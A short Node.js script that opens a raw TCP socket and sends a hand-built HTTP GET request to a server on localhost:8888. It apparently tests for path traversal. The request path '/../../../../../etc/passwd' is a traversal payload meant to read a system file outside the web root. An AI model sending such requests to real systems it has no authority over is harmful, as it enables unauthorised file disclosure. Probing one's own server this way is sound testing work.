var net = require("net");
var path = require("path");

function httpClient(type, host, port, url, hostHeader, dontUseHeader) {
	var client = new net.Socket();
	client.connect({host: host, port: port}, function(a, b, c) {
		//console.log(a, b, c);
	});

	client.on("connect", function(a, b, c) {
		//console.log("on connect:", a, b, c);
	});
	client.on("close", function(a, b, c) {
		//console.log("on close:", a, b, c);
	});
	client.on("data", function(a, b, c) {
		console.log("on data:", a.toString("utf8", 0, a.length));
	});
	client.on("end", function(a, b, c) {
		//console.log("on end:", a, b, c);
	});
	client.on("error", function(a, b, c) {
		//console.log("on error:", a, b, c);
	});
	client.on("ready", function(a, b, c) {
		var headers = [`${type} ${url} HTTP/1.1`, dontUseHeader ? "" : `Host: ${hostHeader}`, "\r\n"].join("\r\n");
		console.log("sent: ", headers);
		client.write(headers);
	});

};
httpClient("GET", "localhost", 8888, "/../../../../../etc/passwd", "localhost:8888");